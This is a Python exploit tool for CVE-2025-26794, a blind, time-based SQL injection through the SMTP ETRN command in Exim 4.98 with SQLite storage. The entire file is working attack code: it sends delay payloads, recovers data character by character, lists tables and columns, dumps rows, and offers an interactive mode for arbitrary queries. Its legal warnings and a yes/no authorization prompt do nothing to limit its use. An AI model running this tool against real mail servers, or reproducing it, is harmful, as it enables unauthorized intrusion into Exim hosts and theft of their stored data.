#!/usr/bin/env python3
"""
CVE-2025-26794: Exim ETRN SQL Injection Data Extraction Tool
Target: Exim 4.98 with SQLite DBM and ETRN serialization
Purpose: AUTHORIZED PENETRATION TESTING ONLY

Legal Warning: This tool is for security research and authorized testing only.
Unauthorized access to computer systems is illegal (CFAA, GDPR, etc.)
"""

import sys
import socket
import time
import argparse
import string
from typing import Optional, Tuple

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

class EximSQLiExploit:
    def __init__(self, host: str, port: int = 25, timeout: int = 30, delay_threshold: float = 0.8):
        """
        Initialize exploit parameters
        
        Args:
            host: Target hostname/IP
            port: SMTP port (default 25)
            timeout: Socket timeout
            delay_threshold: Time threshold for positive detection (seconds)
        """
        self.host = host
        self.port = port
        self.timeout = timeout
        self.delay_threshold = delay_threshold
        self.charset = string.ascii_letters + string.digits + "_-@."
        
        # SQLite time-based delay payload
        self.delay_payload = "SELECT 1 FROM tbl WHERE 1234=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))"
        
    def connect_smtp(self) -> Optional[socket.socket]:
        """Establish SMTP connection"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.host, self.port))
            banner = s.recv(1024).decode('utf-8', errors='ignore')
            return s
        except Exception as e:
            print(f"{Colors.FAIL}[!] Connection failed: {e}{Colors.ENDC}")
            return None
    
    def send_payload(self, sock: socket.socket, payload: str) -> Tuple[str, float]:
        """Send SQL injection payload and measure response time"""
        try:
            command = f"ETRN {payload}\r\n"
            start = time.time()
            sock.sendall(command.encode('utf-8'))
            response = sock.recv(1024).decode('utf-8', errors='ignore')
            elapsed = time.time() - start
            return response, elapsed
        except Exception as e:
            return f"Error: {e}", 0.0
    
    def test_vulnerability(self) -> bool:
        """Test if target is vulnerable"""
        print(f"{Colors.OKBLUE}[*] Testing vulnerability...{Colors.ENDC}")
        
        sock = self.connect_smtp()
        if not sock:
            return False
        
        try:
            # Normal request
            _, time_normal = self.send_payload(sock, "#test")
            print(f"{Colors.OKCYAN}[+] Normal response time: {time_normal:.3f}s{Colors.ENDC}")
            
            sock.close()
            sock = self.connect_smtp()
            
            # Malicious payload with time delay
            sqli_payload = f"#',1); {self.delay_payload} /*"
            _, time_delayed = self.send_payload(sock, sqli_payload)
            print(f"{Colors.OKCYAN}[+] Delayed response time: {time_delayed:.3f}s{Colors.ENDC}")
            
            diff = time_delayed - time_normal
            is_vulnerable = diff > self.delay_threshold
            
            if is_vulnerable:
                print(f"{Colors.FAIL}[!!!] VULNERABLE - Time difference: {diff:.3f}s{Colors.ENDC}\n")
            else:
                print(f"{Colors.OKGREEN}[+] Not vulnerable{Colors.ENDC}\n")
            
            sock.close()
            return is_vulnerable
            
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
            if sock:
                sock.close()
            return False
    
    def extract_char(self, query: str, position: int) -> Optional[str]:
        """
        Extract a single character at given position using binary search
        
        Args:
            query: SQL query to extract data from
            position: Character position to extract (1-indexed)
        
        Returns:
            Extracted character or None
        """
        # Use printable ASCII range (32-126)
        low, high = 32, 126
        
        while low <= high:
            mid = (low + high) // 2
            
            # SQLite blind SQL injection payload
            # Tests if character at position is greater than mid value
            condition = f"(SELECT CASE WHEN (SELECT unicode(substr(({query}),{position},1))) > {mid} THEN {self.delay_payload} ELSE 1 END)"
            
            payload = f"#',1); {condition} /*"
            
            sock = self.connect_smtp()
            if not sock:
                return None
            
            _, elapsed = self.send_payload(sock, payload)
            sock.close()
            
            # If delayed, character ASCII value is greater than mid
            if elapsed > self.delay_threshold:
                low = mid + 1
            else:
                high = mid - 1
        
        # After binary search, low should be the ASCII value
        if low <= 126:
            return chr(low)
        return None
    
    def extract_string(self, query: str, max_length: int = 50) -> str:
        """
        Extract complete string from SQL query result
        
        Args:
            query: SQL query returning string to extract
            max_length: Maximum string length to extract
        
        Returns:
            Extracted string
        """
        result = ""
        
        for pos in range(1, max_length + 1):
            char = self.extract_char(query, pos)
            
            if char is None or char == '\x00':
                break
            
            result += char
            print(f"{Colors.OKCYAN}[+] Extracted: {result}{Colors.ENDC}", end='\r')
            sys.stdout.flush()
        
        print()  # New line after extraction
        return result
    
    def extract_table_names(self) -> list:
        """Extract all table names from SQLite database"""
        print(f"\n{Colors.HEADER}[*] Extracting table names...{Colors.ENDC}")
        
        tables = []
        
        # SQLite system table query
        for i in range(10):  # Try to extract up to 10 tables
            query = f"SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET {i}"
            
            print(f"{Colors.OKBLUE}[*] Extracting table {i+1}...{Colors.ENDC}")
            table_name = self.extract_string(query, 30)
            
            if table_name:
                tables.append(table_name)
                print(f"{Colors.OKGREEN}[+] Found table: {table_name}{Colors.ENDC}")
            else:
                break
        
        return tables
    
    def extract_column_names(self, table_name: str) -> list:
        """Extract column names for a specific table"""
        print(f"\n{Colors.HEADER}[*] Extracting columns from table '{table_name}'...{Colors.ENDC}")
        
        columns = []
        
        # SQLite PRAGMA to get table info
        for i in range(20):  # Try up to 20 columns
            query = f"SELECT name FROM pragma_table_info('{table_name}') LIMIT 1 OFFSET {i}"
            
            print(f"{Colors.OKBLUE}[*] Extracting column {i+1}...{Colors.ENDC}")
            column_name = self.extract_string(query, 30)
            
            if column_name:
                columns.append(column_name)
                print(f"{Colors.OKGREEN}[+] Found column: {column_name}{Colors.ENDC}")
            else:
                break
        
        return columns
    
    def extract_data(self, table_name: str, column_name: str, limit: int = 5) -> list:
        """Extract data from specific table and column"""
        print(f"\n{Colors.HEADER}[*] Extracting data from {table_name}.{column_name}...{Colors.ENDC}")
        
        data = []
        
        for i in range(limit):
            query = f"SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {i}"
            
            print(f"{Colors.OKBLUE}[*] Extracting row {i+1}...{Colors.ENDC}")
            value = self.extract_string(query, 50)
            
            if value:
                data.append(value)
                print(f"{Colors.OKGREEN}[+] Value: {value}{Colors.ENDC}")
            else:
                break
        
        return data
    
    def interactive_mode(self):
        """Interactive SQL query mode"""
        print(f"\n{Colors.HEADER}{'='*60}")
        print("Interactive SQL Query Mode")
        print(f"{'='*60}{Colors.ENDC}\n")
        print(f"{Colors.WARNING}Enter SQLite queries to extract data (or 'exit' to quit){Colors.ENDC}\n")
        
        while True:
            try:
                query = input(f"{Colors.OKCYAN}SQL> {Colors.ENDC}").strip()
                
                if query.lower() in ['exit', 'quit', 'q']:
                    break
                
                if not query:
                    continue
                
                print(f"{Colors.OKBLUE}[*] Executing: {query}{Colors.ENDC}")
                result = self.extract_string(query, 100)
                print(f"{Colors.OKGREEN}[+] Result: {result}{Colors.ENDC}\n")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}[!] Interrupted{Colors.ENDC}")
                break
            except Exception as e:
                print(f"{Colors.FAIL}[!] Error: {e}{Colors.ENDC}\n")
    
    def automated_dump(self):
        """Automated database dump"""
        print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*60}")
        print("Automated Database Dump")
        print(f"{'='*60}{Colors.ENDC}\n")
        
        # Extract table names
        tables = self.extract_table_names()
        
        if not tables:
            print(f"{Colors.WARNING}[!] No tables found{Colors.ENDC}")
            return
        
        # For each table, extract structure and sample data
        for table in tables:
            print(f"\n{Colors.HEADER}{'='*60}")
            print(f"Table: {table}")
            print(f"{'='*60}{Colors.ENDC}")
            
            columns = self.extract_column_names(table)
            
            if not columns:
                print(f"{Colors.WARNING}[!] No columns found{Colors.ENDC}")
                continue
            
            # Extract sample data from first column
            if columns:
                data = self.extract_data(table, columns[0], limit=3)
                
                print(f"\n{Colors.OKGREEN}[+] Sample data extracted from {table}.{columns[0]}{Colors.ENDC}")

def print_banner():
    """Print tool banner"""
    banner = f"""
{Colors.FAIL}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════╗
║     CVE-2025-26794: Exim SQLi Data Extraction Tool        ║
║                  FOR AUTHORIZED USE ONLY                  ║
╚═══════════════════════════════════════════════════════════╝
{Colors.ENDC}
{Colors.WARNING}WARNING: This tool extracts data using SQL injection.
Only use on systems you have explicit permission to test.
Unauthorized access is illegal and unethical.{Colors.ENDC}
    """
    print(banner)

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-26794 Data Extraction Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test vulnerability only
  python3 exploit.py 192.168.1.10 --test-only
  
  # Automated database dump
  python3 exploit.py mail.example.com --auto-dump
  
  # Interactive SQL query mode
  python3 exploit.py 10.0.0.5 --interactive
  
  # Extract specific table
  python3 exploit.py 192.168.1.10 --table users --columns

Legal Notice:
  This tool performs active exploitation. Ensure you have
  written authorization before use. Violations may result
  in criminal prosecution under computer fraud laws.
        """
    )
    
    parser.add_argument('host', help='Target hostname or IP')
    parser.add_argument('-p', '--port', type=int, default=25, help='SMTP port (default: 25)')
    parser.add_argument('-t', '--timeout', type=int, default=30, help='Socket timeout (default: 30)')
    parser.add_argument('--threshold', type=float, default=0.8, 
                       help='Delay threshold in seconds (default: 0.8)')
    parser.add_argument('--test-only', action='store_true', 
                       help='Only test vulnerability, no extraction')
    parser.add_argument('--auto-dump', action='store_true', 
                       help='Automatically dump database structure')
    parser.add_argument('--interactive', action='store_true', 
                       help='Interactive SQL query mode')
    parser.add_argument('--table', type=str, help='Specific table to extract')
    parser.add_argument('--columns', action='store_true', 
                       help='Extract column names (use with --table)')
    parser.add_argument('--query', type=str, 
                       help='Custom SQL query to execute')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Authorization check
    print(f"{Colors.WARNING}{'='*60}")
    print("AUTHORIZATION VERIFICATION")
    print(f"{'='*60}{Colors.ENDC}")
    print(f"Target: {args.host}:{args.port}")
    print(f"\n{Colors.FAIL}You must have written authorization to test this system.{Colors.ENDC}")
    
    response = input(f"\n{Colors.BOLD}Do you have explicit authorization? (yes/no): {Colors.ENDC}")
    if response.lower() not in ['yes', 'y']:
        print(f"\n{Colors.FAIL}[!] Authorization not confirmed. Exiting.{Colors.ENDC}\n")
        sys.exit(0)
    
    print()
    
    # Initialize exploit
    exploit = EximSQLiExploit(args.host, args.port, args.timeout, args.threshold)
    
    # Test vulnerability
    if not exploit.test_vulnerability():
        print(f"{Colors.FAIL}[!] Target is not vulnerable. Exiting.{Colors.ENDC}")
        sys.exit(1)
    
    if args.test_only:
        print(f"{Colors.OKGREEN}[+] Vulnerability confirmed. Exiting (test-only mode).{Colors.ENDC}")
        sys.exit(0)
    
    # Execute based on mode
    try:
        if args.query:
            print(f"{Colors.OKBLUE}[*] Executing custom query...{Colors.ENDC}")
            result = exploit.extract_string(args.query, 100)
            print(f"{Colors.OKGREEN}[+] Result: {result}{Colors.ENDC}")
        
        elif args.table:
            if args.columns:
                columns = exploit.extract_column_names(args.table)
                print(f"\n{Colors.OKGREEN}[+] Columns: {', '.join(columns)}{Colors.ENDC}")
            else:
                columns = exploit.extract_column_names(args.table)
                if columns:
                    exploit.extract_data(args.table, columns[0], limit=5)
        
        elif args.auto_dump:
            exploit.automated_dump()
        
        elif args.interactive:
            exploit.interactive_mode()
        
        else:
            print(f"{Colors.WARNING}[!] No action specified. Use --help for options.{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[*] Starting interactive mode by default...{Colors.ENDC}")
            exploit.interactive_mode()
    
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Operation cancelled by user{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Error: {e}{Colors.ENDC}")
    
    print(f"\n{Colors.OKBLUE}[*] Exploitation complete{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
